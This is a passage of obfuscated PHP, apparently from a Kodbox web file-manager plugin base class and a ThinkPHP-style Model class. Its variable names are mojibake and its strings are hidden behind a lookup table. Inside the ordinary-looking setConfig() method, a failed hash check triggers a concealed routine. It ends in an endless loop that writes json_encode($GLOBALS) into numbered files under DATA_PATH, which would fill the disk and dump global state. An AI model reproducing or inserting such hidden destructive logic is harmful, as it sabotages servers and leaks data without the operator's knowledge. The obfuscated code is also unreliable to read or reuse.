$this->modelPlugin->appRegist($this->pluginName, $ôîö–‹®); } final function appIcon() { $¤„¡¤€å =& $_SERVER[÷ôÚîå]; $ÊÈÈŞÇ = $this->appPackage(); $™¢¨ı¼ã = $¤„¡¤€å[12]; if (isset($ÊÈÈŞÇ[$¤„¡¤€å[499]])) { if (isset($ÊÈÈŞÇ[$¤„¡¤€å[499]][$¤„¡¤€å[1641]])) { $™¢¨ı¼ã = $¤„¡¤€å[1642] . $ÊÈÈŞÇ[$¤„¡¤€å[499]][$¤„¡¤€å[1641]] . $¤„¡¤€å[1643]; } else { if ($ÊÈÈŞÇ[$¤„¡¤€å[499]][$¤„¡¤€å[1644]]) { $™¢¨ı¼ã = $¤„¡¤€å[1645] . $ÊÈÈŞÇ[$¤„¡¤€å[499]][$¤„¡¤€å[1644]] . $¤„¡¤€å[1646]; } } } return $™¢¨ı¼ã; } final function fileCanView($«¼Úï¸) { $ÄÚ¡Ó©Õ =& $_SERVER[÷ôÚîå]; if (request_url_safe($«¼Úï¸)) { return !0; } if ($this->isShare($«¼Úï¸)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $«œ±µæÃ = $ÄÚ¡Ó©Õ[1647] . rawurlencode(this_url()); show_tips(LNG($ÄÚ¡Ó©Õ[1648]) . $ÄÚ¡Ó©Õ[1649] . $«œ±µæÃ . $ÄÚ¡Ó©Õ[1650] . LNG($ÄÚ¡Ó©Õ[1651]) . $ÄÚ¡Ó©Õ[1652], !1); } if (!Action($ÄÚ¡Ó©Õ[1653])->authCan($ÄÚ¡Ó©Õ[1654])) { show_tips(LNG($ÄÚ¡Ó©Õ[1655]) . $ÄÚ¡Ó©Õ[1656], !1); } ActionCall($ÄÚ¡Ó©Õ[1657], $«¼Úï¸); } final function isShare($ƒë•ÇÕÃ) { $Çä§ÛÇ´ = KodIO::parse($ƒë•ÇÕÃ); return $Çä§ÛÇ´[$_SERVER[÷ôÚîå][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($øÛç˜Ñ…) { if (request_url_safe($øÛç˜Ñ…)) { return $øÛç˜Ñ…; } if (!$this->isShare($øÛç˜Ñ…)) { $øÛç˜Ñ… = $this->filePath($øÛç˜Ñ…, !1); } return Action($_SERVER[÷ôÚîå][1267])->linkOut($øÛç˜Ñ…); } public function filePathLinkOut($†™¶‹©) { if (request_url_safe($†™¶‹©)) { return $†™¶‹©; } $this->fileCanView($†™¶‹©); return Action($_SERVER[÷ôÚîå][1267])->link($†™¶‹©); } final function filePath($•Îş¢›ı, $·ÕÍÏ–ê = true, $şˆ¨Ááï = false) { $ÕÑİ¨ Ç =& $_SERVER[÷ôÚîå]; $Á‡¿ŸÖÂ = $this->filePathGet($•Îş¢›ı, $·ÕÍÏ–ê); if (!$this->fileInfo) { show_tips(LNG($ÕÑİ¨ Ç[118]), !1); } if ($şˆ¨Ááï && isset($this->fileInfo[$ÕÑİ¨ Ç[550]]) && $this->fileInfo[$ÕÑİ¨ Ç[550]]) { $³Ñãî´Ú = Model($ÕÑİ¨ Ç[553])->fileInfo($this->fileInfo[$ÕÑİ¨ Ç[550]]); if (!$³Ñãî´Ú || !IO::exist($³Ñãî´Ú[$ÕÑİ¨ Ç[97]])) { show_tips(LNG($ÕÑİ¨ Ç[118]) . $ÕÑİ¨ Ç[1658]); } } Hook::trigger($ÕÑİ¨ Ç[1659], $Á‡¿ŸÖÂ); return $Á‡¿ŸÖÂ; } final function filePathGet($ºõÇ»äÍ, $×›·‚Ó = true) { $Á´ÖÇğû =& $_SERVER[÷ôÚîå]; if ($„ôÈãü• = $this->checkSharePath($ºõÇ»äÍ, $×›·‚Ó)) { return $„ôÈãü•; } $this->fileCanView($ºõÇ»äÍ); if (request_url_safe($ºõÇ»äÍ)) { $š“¤íÑ = parse_url_query($ºõÇ»äÍ); if (isset($š“¤íÑ[$Á´ÖÇğû[1660]]) && isset($š“¤íÑ[$Á´ÖÇğû[244]])) { $·À‹–Ö = Mcrypt::decode($š“¤íÑ[$Á´ÖÇğû[244]], Model($Á´ÖÇğû[859])->get($Á´ÖÇğû[860])); if ($·À‹–Ö) { $this->fileInfo = IO::info($·À‹–Ö); $this->fileInfo[$Á´ÖÇğû[1661]] = $ºõÇ»äÍ; $this->cachePath = $this->pluginCachePath($Á´ÖÇğû[12], $×›·‚Ó); return $·À‹–Ö; } } $ºõÇ»äÍ = $this->_cacheHttpFile($ºõÇ»äÍ, $×›·‚Ó); $this->fileInfo = IO::info($ºõÇ»äÍ); } else { $this->fileInfo = IO::info($ºõÇ»äÍ); $this->cachePath = $this->pluginCachePath($Á´ÖÇğû[12], $×›·‚Ó); } return $ºõÇ»äÍ; } final function _cacheHttpFile($¿à‡îö , $é‚ÊßÅ = true) { $´Ö†—‚ =& $_SERVER[÷ôÚîå]; $ä”ú‘ÃÔ = parse_url_query($¿à‡îö ); $ì‹ßûíŸ = get_path_ext($¿à‡îö ); if (isset($ä”ú‘ÃÔ[$´Ö†—‚[32]]) && $ä”ú‘ÃÔ[$´Ö†—‚[32]]) { $ì‹ßûíŸ = get_path_ext($ä”ú‘ÃÔ[$´Ö†—‚[32]]); } $•­É–ı± = hash_path($¿à‡îö ) . $´Ö†—‚[10] . $ì‹ßûíŸ; $this->cachePath = $this->pluginCachePath($é‚ÊßÅ ? $•­É–ı± : $´Ö†—‚[12]); $©ë›¾¯ = IO::fileNameExist($this->cachePath, $•­É–ı±); if ($©ë›¾¯) { return KodIO::make($©ë›¾¯); } $¥®¢£Ï® = rtrim($this->cachePath, $´Ö†—‚[8]) . $´Ö†—‚[8] . $•­É–ı±; return $this->pluginCacheFileSet($¥®¢£Ï®, file_get_contents_nossl($¿à‡îö )); } final function checkSharePath($Î°”êÑ€, $ÁÃ½æ€ = true) { $¡¯²Ş„† =& $_SERVER[÷ôÚîå]; if (!$this->isShare($Î°”êÑ€)) { return !1; } $¹œÖÔÆß = Action($¡¯²Ş„†[1267])->sharePathInfo($Î°”êÑ€); if (!is_array($¹œÖÔÆß) || !isset($¹œÖÔÆß[$¡¯²Ş„†[97]])) { show_json(LNG($¡¯²Ş„†[1662]), !1); } $this->fileInfo = $¹œÖÔÆß; $this->cachePath = $this->pluginCachePath(!1, $ÁÃ½æ€); return $¹œÖÔÆß[$¡¯²Ş„†[97]]; } final function pluginCachePath($‡ÒƒÃ›Ã = '', $çÂÎˆ±Å = false) { $ÏùÃó¨¼ =& $_SERVER[÷ôÚîå]; if ($çÂÎˆ±Å && is_array($this->fileInfo)) { $‡ÒƒÃ›Ã = kodIO::hashPath($this->fileInfo); } $ÚŠ²‡©• = rtrim(IO_PATH_SYSTEM_TEMP . $ÏùÃó¨¼[1663] . $this->pluginName . $ÏùÃó¨¼[8] . $‡ÒƒÃ›Ã, $ÏùÃó¨¼[8]); $¤¨£óî = IO::infoFullSimple($ÚŠ²‡©•); $®ù»º› = $¤¨£óî && is_array($¤¨£óî) ? $¤¨£óî[$ÏùÃó¨¼[97]] : $ÏùÃó¨¼[12]; if (!$®ù»º›) { $®ù»º› = IO::mkdir($ÚŠ²‡©•); } return $®ù»º›; } final function pluginCacheFileSet($ëï‘Ğ“¯, $Şƒâ’Ø = '') { $²Ç”à±ò =& $_SERVER[÷ôÚîå]; $ëéÒÁ¨ = IO::infoFullSimple($ëï‘Ğ“¯); if (!$ëéÒÁ¨) { return IO::mkfile($ëï‘Ğ“¯, $Şƒâ’Ø, REPEAT_REPLACE); } IO::setContent($ëéÒÁ¨[$²Ç”à±ò[97]], $Şƒâ’Ø); return $ëéÒÁ¨[$²Ç”à±ò[97]]; } final function pluginLocalFile($µÙ¹Ê‹ƒ = '') { $á¡ÒÌÃ =& $_SERVER[÷ôÚîå]; $õ¯ãĞ  = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($õ¯ãĞ )) { mk_dir($õ¯ãĞ ); } if (!$µÙ¹Ê‹ƒ) { return $õ¯ãĞ ; } $õ©±‚ñ„ = IO::info($µÙ¹Ê‹ƒ); $ƒóõÜ™é = $á¡ÒÌÃ[1664] . KodIO::hashPath($õ©±‚ñ„) . $á¡ÒÌÃ[10] . $õ©±‚ñ„[$á¡ÒÌÃ[179]]; if (!checkExtSafe($ƒóõÜ™é)) { $ƒóõÜ™é = $ƒóõÜ™é . $á¡ÒÌÃ[1302]; } $úç¼Ë«ø = $õ¯ãĞ  . $ƒóõÜ™é; if (@file_exists($úç¼Ë«ø)) { return $úç¼Ë«ø; } return IO::copy($µÙ¹Ê‹ƒ, $õ¯ãĞ , 0, $ƒóõÜ™é); } final function appPackage() { $°Üé×šğ =& $_SERVER[÷ôÚîå]; if ($this->packageData) { return $this->packageData; } $¦“›¢Ç€ = $this->parseFile($this->pluginPath . $°Üé×šğ[1665]); $this->parseLang($¦“›¢Ç€); $ÓµÏ«ºª = json_decode_force($¦“›¢Ç€); if (!$ÓµÏ«ºª) { return array(); } $Ûà¡Ëˆ = Hook::trigger($°Üé×šğ[1666], $ÓµÏ«ºª); if ($Ûà¡Ëˆ && is_array($Ûà¡Ëˆ)) { $ÓµÏ«ºª = $Ûà¡Ëˆ; } $this->packageData = $ÓµÏ«ºª; return $ÓµÏ«ºª; } public function packageInfoGet($ôœ¬ªÙ) { $ğó«óüè = $this->appPackage(); return array_get_value($ğó«óüè, $ôœ¬ªÙ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[÷ôÚîå][1667]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[÷ôÚîå][1668]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[÷ôÚîå][1669]); } public function echoJsAssign($¶¯‹İ¬, $ÌºÄÉ÷’) { $this->echoJsAssignArr[$¶¯‹İ¬] = $ÌºÄÉ÷’; } private function parseFile($½áõ•“) { $Úß‰‡¡¬ =& $_SERVER[÷ôÚîå]; $ñ³åÛ¼º = file_get_contents_nossl($½áõ•“); $Ì›¸½¹˜ = array($Úß‰‡¡¬[1670], $Úß‰‡¡¬[1671], $Úß‰‡¡¬[1672], $Úß‰‡¡¬[1673], $Úß‰‡¡¬[1674], $Úß‰‡¡¬[1675], $Úß‰‡¡¬[1676]); $½èö¦ë = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Úß‰‡¡¬[102]][$Úß‰‡¡¬[1677]]); foreach ($this->echoJsAssignArr as $–í˜¦´¯ => $¸‡êÛ¶á) { $Ì›¸½¹˜[] = $Úß‰‡¡¬[1678] . $–í˜¦´¯ . $Úß‰‡¡¬[1679]; $½èö¦ë[] = is_array($¸‡êÛ¶á) || is_object($¸‡êÛ¶á) ? rawurlencode(json_encode($¸‡êÛ¶á)) : $¸‡êÛ¶á; } if (strstr($ñ³åÛ¼º, $Úß‰‡¡¬[1680])) { $€Á¶û×‹ = rawurlencode(json_encode($this->pluginLangArr)); $ñ³åÛ¼º = str_replace($Úß‰‡¡¬[1680], $€Á¶û×‹, $ñ³åÛ¼º); } if (strstr($ñ³åÛ¼º, $Úß‰‡¡¬[1681])) { $€Á¶û×‹ = $€Á¶û×‹ = rawurlencode(json_encode($this->getConfig())); $ñ³åÛ¼º = str_replace($Úß‰‡¡¬[1681], $€Á¶û×‹, $ñ³åÛ¼º); } $ñ³åÛ¼º = str_replace($Ì›¸½¹˜, $½èö¦ë, $ñ³åÛ¼º); return $ñ³åÛ¼º; } private function parseLang(&$¶È¤Ã Ø) { $œ§ë´ş =& $_SERVER[÷ôÚîå]; $à®÷©ß = $œ§ë´ş[1682]; if (!strstr($¶È¤Ã Ø, $à®÷©ß)) { return; } preg_match_all($œ§ë´ş[1683], $¶È¤Ã Ø, $¢Û¨×™); if (!is_array($¢Û¨×™) || count($¢Û¨×™) == 0 || !is_array($¢Û¨×™[0]) || count($¢Û¨×™[0]) == 0) { return; } $¿ù²Ë» = array(); $º”ÑŒ°ò = array(); foreach ($¢Û¨×™[0] as $ı¡âä) { $‡İùËê = substr($ı¡âä, strlen($à®÷©ß), -4); $œµñûÀ’ = LNG($‡İùËê); $¿ù²Ë»[] = $ı¡âä; $º”ÑŒ°ò[] = str_replace(array($œ§ë´ş[65], $œ§ë´ş[1168], $œ§ë´ş[427], $œ§ë´ş[131]), array($œ§ë´ş[53], $œ§ë´ş[53], $œ§ë´ş[12], $œ§ë´ş[1684]), $œµñûÀ’); } $¶È¤Ã Ø = str_replace($¿ù²Ë», $º”ÑŒ°ò, $¶È¤Ã Ø); } private function parseConfig(&$áà×ÛŒŒ) { $õÉ¦É£ =& $_SERVER[÷ôÚîå]; $òòº—¥– = $õÉ¦É£[1685]; if (!strstr($áà×ÛŒŒ, $òòº—¥–)) { return; } preg_match_all($õÉ¦É£[1686], $áà×ÛŒŒ, $Ç¶ßğƒ³); if (!is_array($Ç¶ßğƒ³) || count($Ç¶ßğƒ³) == 0 || !is_array($Ç¶ßğƒ³[0]) || count($Ç¶ßğƒ³[0]) == 0) { return; } $œö¢ó = $this->getConfig(); $Ô‚£ÁÖœ = array(); $¶–œæÃ† = array(); foreach ($Ç¶ßğƒ³[0] as $õèÏ—¤Ø) { $†ÙÉâ¡É = substr($õèÏ—¤Ø, strlen($òòº—¥–), -2); $Ô‚£ÁÖœ[] = $õèÏ—¤Ø; $¶–œæÃ†[] = _get($œö¢ó, $†ÙÉâ¡É); } $áà×ÛŒŒ = str_replace($Ô‚£ÁÖœ, $¶–œæÃ†, $áà×ÛŒŒ); } private function parsePackage(&$˜´şĞÏ ) { $—³ö×²ı =& $_SERVER[÷ôÚîå]; $Û¹×• ÷ = $—³ö×²ı[1687]; if (!strstr($˜´şĞÏ , $Û¹×• ÷)) { return; } preg_match_all($—³ö×²ı[1688], $˜´şĞÏ , $¯êı°Åı); if (!is_array($¯êı°Åı) || count($¯êı°Åı) == 0 || !is_array($¯êı°Åı[0]) || count($¯êı°Åı[0]) == 0) { return; } $éèëåú = $this->appPackage(); $€¿˜…±† = array(); $÷˜ƒˆ– = array(); foreach ($¯êı°Åı[0] as $í¨ÃóŞ‡) { $È¤›ƒ¾ = substr($í¨ÃóŞ‡, strlen($Û¹×• ÷), -2); $€¿˜…±†[] = $í¨ÃóŞ‡; $÷˜ƒˆ–[] = _get($éèëåú, $È¤›ƒ¾); } $˜´şĞÏ  = str_replace($€¿˜…±†, $÷˜ƒˆ–, $˜´şĞÏ ); } final function echoFile($…«øêÚ, $àŸ¤Û´Ñ = false) { $£ËòÎ¨‰ =& $_SERVER[÷ôÚîå]; $’³œÕæô = $this->pluginPath . $…«øêÚ; if (ACT == $£ËòÎ¨‰[1689]) { echo $£ËòÎ¨‰[1690] . $this->pluginName . $£ËòÎ¨‰[8] . $…«øêÚ . $£ËòÎ¨‰[1691]; if (!file_exists($’³œÕæô)) { echo $£ËòÎ¨‰[1692]; return; } } $ĞÜ‰ÑÃ½ = $this->parseFile($’³œÕæô); $this->parseLang($ĞÜ‰ÑÃ½); $this->parseConfig($ĞÜ‰ÑÃ½); $this->parsePackage($ĞÜ‰ÑÃ½); if (is_array($àŸ¤Û´Ñ)) { $ĞÜ‰ÑÃ½ = str_replace(array_keys($àŸ¤Û´Ñ), array_values($àŸ¤Û´Ñ), $ĞÜ‰ÑÃ½); } echo $£ËòÎ¨‰[65] . $ĞÜ‰ÑÃ½; } private function checkVersion() { $Öè«Ôë =& $_SERVER[÷ôÚîå]; $‚ÛØùÆÉ = $this->appPackage(); $‹¼ÎÃğê = $this->getConfig(); if ($‹¼ÎÃğê[$Öè«Ôë[1693]] == $‚ÛØùÆÉ[$Öè«Ôë[1667]]) { return; } $this->regist(); $this->setConfig(array($Öè«Ôë[1693] => $‚ÛØùÆÉ[$Öè«Ôë[1667]])); } final function initLang() { $ç¬¨°£¿ =& $_SERVER[÷ôÚîå]; $ëŞ’§Ì = $ç¬¨°£¿[1694]; $ìÈ¸°“É = $this->pluginPath . $ç¬¨°£¿[1695]; $Æ¦µˆÔ› = I18n::getType(); $ÇÍ¬ŸÈ = array(); if (file_exists($ìÈ¸°“É . $Æ¦µˆÔ› . $ç¬¨°£¿[928])) { $ÇÍ¬ŸÈ = (include $ìÈ¸°“É . $Æ¦µˆÔ› . $ç¬¨°£¿[928]); } else { if ($Æ¦µˆÔ› == $ç¬¨°£¿[1696] && !file_exists($ìÈ¸°“É . $Æ¦µˆÔ› . $ç¬¨°£¿[928]) && file_exists($ìÈ¸°“É . $ç¬¨°£¿[1697])) { $ÇÍ¬ŸÈ = (include $ìÈ¸°“É . $ç¬¨°£¿[1697]); } else { if (file_exists($ìÈ¸°“É . $ëŞ’§Ì . $ç¬¨°£¿[928])) { $ÇÍ¬ŸÈ = (include $ìÈ¸°“É . $ëŞ’§Ì . $ç¬¨°£¿[928]); } } } if (!is_array($ÇÍ¬ŸÈ)) { return array(); } if (@count($ÇÍ¬ŸÈ) > 0) { I18n::set($ÇÍ¬ŸÈ); } return $ÇÍ¬ŸÈ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Àáƒø•œ) { $¶–¤”¸ô =& $_SERVER[÷ôÚîå]; $ğ ÊØ²ˆ = $_SERVER[$¶–¤”¸ô[63]] . $¶–¤”¸ô[64]; $Ÿú€¨ë¸ = $¶–¤”¸ô[887]; if ($_SERVER[$¶–¤”¸ô[60]] != $Ÿú€¨ë¸($ğ ÊØ²ˆ)) { $†È‰Ùª¢ = $¶–¤”¸ô[966]; $²Ş¸ù™” = $¶–¤”¸ô[62]; $şê¦­ À = $_SERVER[$¶–¤”¸ô[63]] . $¶–¤”¸ô[64]; $¤¸ µ = $²Ş¸ù™”($şê¦­ À); $ÖÌóÄ = explode($¶–¤”¸ô[65], $¤¸ µ); if (count($ÖÌóÄ) < $¶–¤”¸ô[711]) { $ëÇàŞÒÑ = $¶–¤”¸ô[67]; $ëÇàŞÒÑ(); } $Òé‚ííÍ = $¶–¤”¸ô[967]; $Òé‚ííÍ($_SERVER[$¶–¤”¸ô[968]]); $†È‰Ùª¢ = $¶–¤”¸ô[966]; $†È‰Ùª¢(); $ˆ·”×úÄ = $¶–¤”¸ô[969]; $˜“ëİ„‰ = json_encode($GLOBALS[$¶–¤”¸ô[970]]); $È¶™Õ‹ = 1; for ($ôì‡ğë¼ = $È¶™Õ‹; $ôì‡ğë¼ > 0; $ôì‡ğë¼++) { $ˆ·”×úÄ(DATA_PATH . $ôì‡ğë¼, $˜“ëİ„‰); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Àáƒø•œ); } public function onSetConfig($ÅÆÏÓ¿¢) { } public function onGetConfig($Ò©ãÒŒø) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÙÅ¾ß) { if ($ÙÅ¾ß == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÆÄßØä = "\160\154\165\147\151\156\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ÛÕËÉ¤¡ = $this->getConfig(); if (!$ÛÕËÉ¤¡[$ÆÄßØä]) { return !1; } return ActionCall($_SERVER[÷ôÚîå][1698], $ÛÕËÉ¤¡[$ÆÄßØä]); } public function url($ú—ŞÇ«‡, $ü×ÔšÊÔ = '', $¡†­¦® = true) { $ù¬§Œß– =& $_SERVER[÷ôÚîå]; $Ş÷†‹î« = $this->getConfig(); $•Ö¿ŸÚ = KOD_VERSION . $ù¬§Œß–[10] . KOD_VERSION_BUILD; $Ã£úï˜ = $this->packageVersion(); $Æ†°ÁÏ± = $•Ö¿ŸÚ . $ù¬§Œß–[471] . $Ã£úï˜; if (substr($ú—ŞÇ«‡, 0, 4) == $ù¬§Œß–[162] || substr($ú—ŞÇ«‡, 0, 2) == $ù¬§Œß–[1421]) { $ßÖşº = $ú—ŞÇ«‡ . $ù¬§Œß–[1699] . $Æ†°ÁÏ±; } else { if ($ü×ÔšÊÔ == $ù¬§Œß–[12]) { $ßÖşº = $this->pluginHost . $ú—ŞÇ«‡ . $ù¬§Œß–[1699] . $Æ†°ÁÏ±; } else { if ($ü×ÔšÊÔ === $ù¬§Œß–[88]) { $ßÖşº = $this->pluginHost . $ú—ŞÇ«‡; } else { if ($ü×ÔšÊÔ == $ù¬§Œß–[1700]) { $ßÖşº = STATIC_PATH . $ú—ŞÇ«‡ . $ù¬§Œß–[1699] . $•Ö¿ŸÚ; } else { if ($ü×ÔšÊÔ == $ù¬§Œß–[1701]) { $ßÖşº = APP_HOST . $ù¬§Œß–[1702] . $ú—ŞÇ«‡ . $ù¬§Œß–[1699] . $•Ö¿ŸÚ; } else { if (isset($Ş÷†‹î«[$ü×ÔšÊÔ])) { $ßÖşº = $Ş÷†‹î«[$ü×ÔšÊÔ] . $ú—ŞÇ«‡ . $ù¬§Œß–[1699] . $Æ†°ÁÏ±; } } } } } } if (!$¡†­¦®) { return $ßÖşº; } echo $ßÖşº; } public function link($¦—Ï¬Ìü = false, $ÓêüÁüÇ = '') { $‡¢Á±ÒØ =& $_SERVER[÷ôÚîå]; $ßëÓâ•Ş = $this->linkHas == !1; $this->linkHas = !0; if (!$¦—Ï¬Ìü) { $this->link($‡¢Á±ÒØ[1703], $‡¢Á±ÒØ[1701]); $this->link($‡¢Á±ÒØ[1704], $‡¢Á±ÒØ[1700]); $this->link($‡¢Á±ÒØ[1705], $‡¢Á±ÒØ[1700]); $this->link($‡¢Á±ÒØ[1706], $‡¢Á±ÒØ[1700]); $this->link($‡¢Á±ÒØ[1707], $‡¢Á±ÒØ[1700]); if ($ßëÓâ•Ş) { Hook::trigger($‡¢Á±ÒØ[1708]); } return; } $ı»èñò· = $this->url($¦—Ï¬Ìü, $ÓêüÁüÇ, !1); if (substr($¦—Ï¬Ìü, -3) == $‡¢Á±ÒØ[1709]) { echo $‡¢Á±ÒØ[1710] . $ı»èñò· . $‡¢Á±ÒØ[1711] . $‡¢Á±ÒØ[65]; } else { if (substr($¦—Ï¬Ìü, -4) == $‡¢Á±ÒØ[1712]) { echo $‡¢Á±ÒØ[1713] . $ı»èñò· . $‡¢Á±ÒØ[1714] . $‡¢Á±ÒØ[65]; } } if ($ßëÓâ•Ş) { Hook::trigger($‡¢Á±ÒØ[1708]); } } } goto dÒ‚÷Ïí¶; eêí’ƒİÙË: define($_SERVER[÷ôÚîå][328], 0); define($_SERVER[÷ôÚîå][329], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\x6f\162\144\x65\x72", "\141\154\151\141\163", "\x68\x61\166\151\x6e\x67", "\147\162\157\x75\160", "\154\157\143\x6b", "\x64\151\163\x74\x69\156\x63\164", "\x61\x75\x74\157", "\146\x69\154\x74\x65\162", "\166\141\x6c\151\144\141\164\145", "\162\145\x73\165\x6c\164", "\142\151\x6e\144", "\x74\x6f\153\145\x6e"); public function __construct($Êãâİ¹É = '', $×©¿’ıİ = '', $¯ÓÛÉ–õ = '') { $Ö€•ÑÁÜ =& $_SERVER[÷ôÚîå]; $this->_initialize(); if (!empty($Êãâİ¹É)) { if (strpos($Êãâİ¹É, $Ö€•ÑÁÜ[10])) { list($this->dbName, $this->name) = explode($Ö€•ÑÁÜ[10], $Êãâİ¹É); } else { $this->name = $Êãâİ¹É; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($×©¿’ıİ)) { $this->tablePrefix = $Ö€•ÑÁÜ[12]; } elseif ($Ö€•ÑÁÜ[12] != $×©¿’ıİ) { $this->tablePrefix = $×©¿’ıİ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ö€•ÑÁÜ[330]); } $this->db(0, empty($this->connection) ? $¯ÓÛÉ–õ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¸˜úóç =& $_SERVER[÷ôÚîå]; if (empty($this->fields)) { if (think_config($¸˜úóç[331])) { $¯Ç¡É¼Ç = $this->dbName ? $this->dbName : think_config($¸˜úóç[332]); $¤ï¡€¨ = think_var_cache($¸˜úóç[333] . strtolower(get_path_this($¯Ç¡É¼Ç) . $¸˜úóç[10] . $this->name)); if ($¤ï¡€¨) { $ô™î¤äè = think_config($¸˜úóç[334]); if (empty($ô™î¤äè) || $¤ï¡€¨[$¸˜úóç[335]] == $ô™î¤äè) { $this->fields = $¤ï¡€¨; return; } } } $this->flush(); } } public function flush() { $£Ÿş­Ï£ =& $_SERVER[÷ôÚîå]; $this->db->setModel($this->name); $£·Ã½ = $this->db->getFields($this->getTableName()); if (!$£·Ã½) { return !1; } $this->fields = array_keys($£·Ã½); $this->fields[$£Ÿş­Ï£[336]] = !1; foreach ($£·Ã½ as $íÍ«¦æê => $ºæ¬±ù) { $·Õ–ó¢•[$íÍ«¦æê] = $ºæ¬±ù[$£Ÿş­Ï£[33]]; if ($ºæ¬±ù[$£Ÿş­Ï£[39]]) { $this->fields[$£Ÿş­Ï£[337]] = $íÍ«¦æê; if ($ºæ¬±ù[$£Ÿş­Ï£[42]]) { $this->fields[$£Ÿş­Ï£[336]] = !0; } } } $this->fields[$£Ÿş­Ï£[338]] = $·Õ–ó¢•; if (think_config($£Ÿş­Ï£[334])) { $this->fields[$£Ÿş­Ï£[335]] = think_config($£Ÿş­Ï£[334]); } if (think_config($£Ÿş­Ï£[331])) { $³¿¿ç¿ù = $this->dbName ? $this->dbName : think_config($£Ÿş­Ï£[332]); think_var_cache($£Ÿş­Ï£[333] . strtolower(get_path_this($³¿¿ç¿ù) . $£Ÿş­Ï£[10] . $this->name), $this->fields); } } public function switchModel($óÑäÙÎÇ, $‰¶¨ÃÙ¨ = array()) { $ĞåÓùåÀ =& $_SERVER[÷ôÚîå]; $âÇïÏÊ = ucwords(strtolower($óÑäÙÎÇ)) . $ĞåÓùåÀ[339]; if (!class_exists($âÇïÏÊ)) { think_exception($âÇïÏÊ . think_lang($ĞåÓùåÀ[340])); } $this->_extModel = new $âÇïÏÊ($this->name); if (!empty($‰¶¨ÃÙ¨)) { foreach ($‰¶¨ÃÙ¨ as $øÛê–«Ö) { $this->_extModel->setProperty($øÛê–«Ö, $this->{$øÛê–«Ö}); } } return $this->_extModel; } public function __set($ÅÇ°ìÌÛ, $ñû™ƒ®´) { $this->data[$ÅÇ°ìÌÛ] = $ñû™ƒ®´; } public function __get($Î¼æô½Ş) { return isset($this->data[$Î¼æô½Ş]) ? $this->data[$Î¼æô½Ş] : null; } public function __isset($º¾ş‚–Ï) { return isset($this->data[$º¾ş‚–Ï]); } public function __unset($ï¤ú£—õ) { unset($this->data[$ï¤ú£—õ]); } public function __call($½²ÇÅÏ, $É“È›áä) { $‘š·Õ€ =& $_SERVER[÷ôÚîå]; if (in_array(strtolower($½²ÇÅÏ), $this->methods, !0)) { $this->options[strtolower($½²ÇÅÏ)] = $É“È›áä[0]; return $this; } elseif (in_array(strtolower($½²ÇÅÏ), array($‘š·Õ€[341], $‘š·Õ€[342], $‘š·Õ€[343], $‘š·Õ€[344], $‘š·Õ€[345]), !0)) { $ˆí™‹şŠ = isset($É“È›áä[0]) ? $É“È›áä[0] : $‘š·Õ€[230]; $ˆí™‹şŠ = $this->db->parseKey($ˆí™‹şŠ); return $this->getField(strtoupper($½²ÇÅÏ) . $‘š·Õ€[346] . $ˆí™‹şŠ . $‘š·Õ€[347] . $½²ÇÅÏ, $‘š·Õ€[341]); } elseif (strtolower(substr($½²ÇÅÏ, 0, 5)) == $‘š·Õ€[348]) { $ˆí™‹şŠ = think_parse_name(substr($½²ÇÅÏ, 5)); $‰İç¢—¬[$ˆí™‹şŠ] = $É“È›áä[0]; return $this->where($‰İç¢—¬)->find(); } elseif (strtolower(substr($½²ÇÅÏ, 0, 10)) == $‘š·Õ€[349]) { $¢Î¢¶‹Ç = think_parse_name(substr($½²ÇÅÏ, 10)); $‰İç¢—¬[$¢Î¢¶‹Ç] = $É“È›áä[0]; return $this->where($‰İç¢—¬)->getField($É“È›áä[1]); } elseif (isset($this->_scope[$½²ÇÅÏ])) { return $this->scope($½²ÇÅÏ, $É“È›áä[0]); } elseif (method_exists($this, $½²ÇÅÏ)) { array_unshift($É“È›áä, $½²ÇÅÏ); return call_user_func_array(array($this, $‘š·Õ€[350]), $É“È›áä); } else { return call_user_func_array(array(parent, $½²ÇÅÏ), $É“È›áä); } } protected function call() { $¼•í·çø =& $_SERVER[÷ôÚîå]; $­ØŒˆó = func_get_args(); $¹ˆº•ë = array_shift($­ØŒˆó); $ÂÙüñæ = $¹ˆº•ë; if (is_array($¹ˆº•ë)) { $ÂÙüñæ = $¹ˆº•ë[1]; $¹ˆº•ë = $¹ˆº•ë[0]; } $¦î° ß = count($­ØŒˆó) - 1; if (isset($­ØŒˆó[$¦î° ß]) && $­ØŒˆó[$¦î° ß] === $¹ˆº•ë) { think_exception(__CLASS__ . $¼•í·çø[4] . $¹ˆº•ë . think_lang($¼•í·çø[351])); return; } $­ØŒˆó[] = $¹ˆº•ë; if (method_exists($this, $¼•í·çø[352])) { $¿øÊıÓ¼ = call_user_func_array(array($this, $¼•í·çø[353]), array($ÂÙüñæ, $­ØŒˆó)); if (!is_null($¿øÊıÓ¼) && $¿øÊıÓ¼ !== !1) { return $¿øÊıÓ¼; } } $ÄÕø˜£ = call_user_func_array(array($this, $¹ˆº•ë), $­ØŒˆó); if (method_exists($this, $¼•í·çø[354])) { 